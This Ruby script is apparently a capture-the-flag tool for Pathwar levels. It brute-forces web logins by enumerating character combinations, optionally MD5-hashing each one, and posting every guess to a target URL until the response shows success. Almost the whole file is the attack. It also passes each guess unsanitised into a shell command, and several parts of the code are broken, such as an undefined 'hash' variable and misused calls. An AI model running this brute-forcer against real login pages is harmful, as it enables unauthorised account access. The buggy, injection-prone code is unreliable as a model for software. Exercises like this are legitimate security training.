#!/usr/bin/env ruby

require 'pry'

module Brute
  ALlo = ('a'..'z').to_a
  ALUP = ('A'..'Z').to_a
  ALAL = ALlo + ALUP
  ALNU = ALAL + ('0'..'9').to_a
  NUON = ('0'..'9').to_a
  GOAT = ['A', 'An', 'Goats', 'Having', 'The', 'a', 'able', 'and', 'animal', 'animals', 'are', 'be', 'cast', 'dead', 'death', 'defenses', 'distance', 'doesn', 'draw', 'each', 'eating', 'few', 'for', 'from', 'goat', 'goats', 'group', 'hasten', 'healthy', 'herd', 'herdmates', 'horns', 'injured', 'is', 'it', 'its', 'keep', 'leave', 'limited', 'long', 'many', 'means', 'members', 'must', 'not', 'of', 'or', 'other', 'out', 'potentially', 'predators', 'prey', 'protection', 'provide', 'quit', 'rest', 'runners', 'safety', 'save', 'separated', 'sick', 'so', 'species', 'sprinters', 't', 'the', 'their', 'they', 'to', 'up', 'while', 'will', 'with']
  MEEE = [" ", "A", "B", "E", "H", "L", "M", "a", "b", "e", "h", "l", "m"]

  def self.next_pass str, syms
    return [syms[0]] if str.empty?
    return next_pass(str[0..-2], syms).to_a + [syms[0]] if str[-1] == syms.last
    return str[0..-2].to_a + [syms[syms.index(str[-1]) + 1]]
  end

  def self.attack size_min=0, size_max=6, syms=ALNU
    if block_given?
      str = [syms[0]] * (size_min + 1)
      while str.size <= size_max
        yield str
        str = next_pass str, syms
      end
      return size_max
    else
      str = syms[0] * (size_min + 1)
      arr = []
      while str.size <= size_max
        arr << str
        str = next_pass str, syms
      end
      return arr
    end
  end

end

def validate pass
  puts "MOT DE PASSE : #{pass}"
  exit
end

def test_tp pass
  @pass = pass
  @md5 = hash == "sys" ? `md5sum <<< #{pass}`.split.first : Digest::MD5.hexdigest(pass)
  # @a.post "http://camembert.levels.pathwar.net/index.php?pass=#{@md5}"
  @a.post "#{$url}#{@md5}"
  # binding.pry
  validation = @a.page.body.gsub(/la passphrase est &lt;b&gt;XXX/, '')
  if validation.include? "la passphrase est "
    puts "#{@md5} found (#{@pass})"
    exit
  end
end

def test_goat pass
  @pass = pass.join('')
  @a.post CONFIG['url_goat'] + @pass
  validation = !@a.page.body.include?('Wrong Credentials')
  validate pass if validation
  puts @a.page.uri
end

if __FILE__ == $0
  require 'mechanize'
  require 'pry'
  require 'yaml'

  @a = Mechanize.new

  CONFIG = YAML.load_file('cred.yml')
  # $url = YAML.load_file('cred.yml')['url']
  $user = CONFIG['user']
  $pass = CONFIG['pass']
  @a.basic_auth($user, $pass)
  # @a.get($url)

  min = ARGV[0].to_i
  max = ARGV[1].to_i
  max = 6 if max.zero?
  hash = ARGV[2].to_s

  puts "Bruteforce with #{min}..#{max}"
  Brute.attack(min, max, Brute::MEEE) do |pass|
    if ARGV[0] == 'goat1'
      test_goat pass
    else
      test_tp pass
    end
    puts "#{@md5} (#{pass}) is not valid"
  end
  test "1000"
  puts "#{@md5} (#{1000}) is not valid"
  puts "NOT FOUND"

end
